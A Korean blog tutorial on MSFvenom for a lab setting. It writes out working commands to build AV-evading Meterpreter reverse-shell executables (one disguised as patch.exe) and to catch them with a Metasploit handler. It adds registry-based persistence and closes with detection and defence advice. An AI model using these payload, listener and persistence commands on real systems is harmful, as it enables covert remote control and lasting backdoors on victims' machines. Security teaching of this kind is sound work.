---
layout: post
title: "MSFvenom (Payload Generation)"
date: 2025-11-10 17:00:00 +0900
categories: [hacking-tools]
---

## 1. 개요

**MSFvenom**은 Metasploit Framework에 포함된 페이로드 생성 및 인코딩 도구이다.
`msfpayload`와 `msfencode`가 통합된 강력한 도구로, 다양한 플랫폼(Windows, Linux, Android 등)에서 동작하는 악성 실행 파일을 생성하거나 정상적인 프로그램에 악성 코드를 주입하여 백신(AV) 탐지를 우회하는 데 사용된다.
본 글에서는 리버스 쉘 페이로드를 생성하는 방법과 이를 받아줄 핸들러(Listener) 설정, 그리고 시스템 재부팅 후에도 연결을 유지하는 지속성(Persistence) 기법을 다룬다.

---

## 2. 페이로드 생성 흐름

```mermaid
flowchart LR
    A[타겟 OS 확인] --> B[페이로드 선택]
    B --> C[MSFvenom 실행]
    C --> D[악성 파일 생성]
    D --> E[핸들러 설정]
    E --> F[파일 전달/실행]
    F --> G[Meterpreter 세션]
```

---

## 3. 주요 옵션

`msfvenom`은 명령줄에서 다양한 옵션을 조합하여 사용한다.

| 옵션 | 설명 |
|------|------|
| `-p` | 사용할 페이로드 지정 (예: `windows/x64/meterpreter/reverse_tcp`) |
| `LHOST` | 리버스 쉘 접속을 받을 공격자 IP |
| `LPORT` | 리버스 쉘 접속을 받을 공격자 포트 |
| `-f` | 출력 파일 형식 (예: `exe`, `elf`, `raw`) |
| `-a` | 아키텍처 지정 (`x86`, `x64`) |
| `--platform` | 대상 운영체제 플랫폼 지정 (`windows`, `linux`) |
| `-e` | 탐지 우회를 위한 인코더 사용 (예: `x64/zutto_dekiru`) |
| `-o` | 저장할 출력 파일명 |

---

## 4. 실습 환경

### Kali Linux (공격자)
악성 페이로드를 생성하고 핸들러(Listener)를 실행하는 환경이다.
```bash
ifconfig eth0  # IP 확인 (LHOST 설정용)
```

### Windows 10/11 VM (피해자)
생성된 실행 파일(`patch.exe`)을 복사하여 실행할 타겟 시스템이다.
*   **주의**: Windows Defender 실시간 감시를 꺼야 실습 가능
*   네트워크는 Host-Only 또는 NAT Network로 내부 통신만 가능하게 격리 권장

---

## 5. 페이로드 생성 실습 (기본)

#### Windows용 악성 실행 파일
64비트 Windows 환경에서 동작하는 Meterpreter 리버스 쉘을 생성한다. `x64/zutto_dekiru` 인코더를 사용하여 AV 탐지 우회 가능성을 높인다.

```bash
msfvenom -a x64 --platform windows \
    -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.0.0.32 LPORT=4444 \
    -f exe -e x64/zutto_dekiru -i 3 \
    -o patch.exe
```

#### Linux용 악성 실행 파일
리눅스 환경용 페이로드는 `elf` 형식으로 생성한다.

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=10.0.0.32 LPORT=4444 \
    -f elf -o malware.elf
```

---

## 6. 리스너 설정 및 연결

생성한 악성 파일이 대상 시스템에서 실행되면 공격자에게 연결을 시도한다. 이를 받기 위해 `msfconsole`에서 핸들러를 실행하고 기다려야 한다.

```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp  # 생성한 것과 동일한 페이로드
msf6 > set LHOST 10.0.0.32
msf6 > set LPORT 4444
msf6 > run
```

대상 PC에서 `patch.exe`가 실행되면, 핸들러에 세션이 연결(`Meterpreter session 1 opened`)된다.

---

## 7. 지속성 유지 (Persistence)

Meterpreter 세션을 획득했더라도 대상 PC가 재부팅되면 연결이 끊어진다. 이를 방지하기 위해 레지스트리 Run 키에 백도어를 등록하여 부팅 시마다 자동으로 연결되도록 설정한다.

```bash
# 현재 세션을 백그라운드로 전환
meterpreter > background

# Persistence 모듈 실행
msf6 > use exploit/windows/local/persistence
msf6 > set SESSION 1
msf6 > run
```

---

## 8. 탐지 및 방어 대책

이러한 악성 행위는 **Sysinternals Autoruns** 도구를 통해 탐지할 수 있다.
`Logon` 탭을 확인하여 `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 경로에 알 수 없는 VBS 스크립트나 실행 파일이 등록되어 있는지 주기적으로 점검해야 한다.

### 방어 방법
*   **Endpoint Protection (EDR)**: 시그니처 기반이 아닌 행위 기반(Heuristic) 탐지 솔루션을 도입하여 미터프리터 주입 행위를 차단한다.
*   **PowerShell 제한**: 일반 사용자의 PowerShell 및 스크립트 실행 권한을 제한(Constrained Language Mode)한다.
*   **Application Whitelisting**: AppLocker 등을 통해 서명되지 않았거나 허용되지 않은 경로의 실행 파일 실행을 원천 차단한다.
*   **아웃바운드 통제**: 방화벽에서 알려지지 않은 외부 IP로의 불필요한 아웃바운드 연결을 차단한다.

<hr class="short-rule">
